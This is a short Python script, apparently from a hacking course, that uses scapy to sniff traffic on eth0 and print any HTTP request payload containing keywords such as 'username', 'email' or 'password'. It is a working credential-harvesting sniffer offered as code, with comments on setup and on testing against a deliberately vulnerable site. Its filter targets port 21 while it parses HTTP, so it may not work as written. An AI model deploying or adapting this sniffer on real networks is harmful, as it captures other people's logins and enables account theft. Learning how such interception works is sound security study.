#!/usr/bin/env python3

#Need to run as python 2 currently, http layer support is different now that scapy_http is deprecated
#https://courses.stationx.net/courses/372297/lectures/5700189
#to find info on other layers, type packet.haslayer (use haslayer method of scapy) and provide the layer name
#ie packet.haslayer(scapy.Ethernet)

import scapy.all as scapy
from scapy_http import http #need scapy_http installed
#scapy_http is now deprecated, and scapy has native support for HTTP: https://github.com/invernizzi/scapy-http
#need to find way to implement
#pip install scapy_http
#pip3 install scapy_http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="port 21")
    #prn = pass to a function for each packet
    #, filter=    filters can be tcp, udp, etc. or specify port by doing port 80
    # http://biot.com/capstats/bpf.html - filters you can use
    
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest): #haslayer - scapy method
        #print(packet)
        print(packet.show()) #shows packet layers that can be accessed
        #using packet.show, you can see on example website (vulnweb.com) that UI and PW will be sent using
        #POST with a field (load in the Raw layer) containing username and password
        if packet.haslayer(scapy.Raw):
            #print(packet[scapy.Raw].load) #print only Load field of Raw layer
            # ##Raw##
            # load    =     etc
            #access layer using packet(variable defined) and then [ ] with layer name
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "login", "email", "password", "pwd", "pass"]
            for keyword in keywords:
                if keyword in load:
                    print(load)
                    break #stop loop once one keyword is found, that way it wont print multiple times
            #if "username" in load:
                #print(load)
                
    
sniff("eth0")
